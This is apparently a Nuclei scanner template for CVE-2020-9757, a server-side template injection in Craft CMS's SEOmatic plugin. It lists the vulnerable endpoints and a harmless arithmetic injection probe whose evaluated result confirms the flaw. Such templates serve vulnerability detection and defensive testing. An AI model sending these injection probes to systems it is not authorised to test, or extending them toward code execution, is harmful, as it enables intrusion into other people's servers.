id: CVE-2020-9757

info:
  name: Craft CMS < 3.3.0 - Server-Side Template Injection
  author: dwisiswant0
  severity: critical
  description: Craft CMS before 3.3.0 is susceptible to server-side template injection via the SEOmatic component that could lead to remote code execution via malformed data submitted to the metacontainers controller.
  reference:
    - https://github.com/nystudio107/craft-seomatic/blob/v3/CHANGELOG.md
    - https://github.com/giany/CVE/blob/master/CVE-2020-9757.txt
    - https://github.com/nystudio107/craft-seomatic/commit/65ab659cb6c914c7ad671af1e417c0da2431f79b
    - https://github.com/nystudio107/craft-seomatic/commit/a1c2cad7e126132d2442ec8ec8e9ab43df02cc0f
    - https://nvd.nist.gov/vuln/detail/CVE-2020-9757
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-9757
    cwe-id: CWE-74
  tags: cve,cve2020,ssti

requests:
  - method: GET
    path:
      - "{{BaseURL}}/actions/seomatic/meta-container/meta-link-container/?uri={{228*'98'}}"
      - "{{BaseURL}}/actions/seomatic/meta-container/all-meta-containers?uri={{228*'98'}}"

    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "MetaLinkContainer"
          - "canonical"
          - "22344"
        condition: and
        part: body

# Enhanced by mp on 2022/04/20
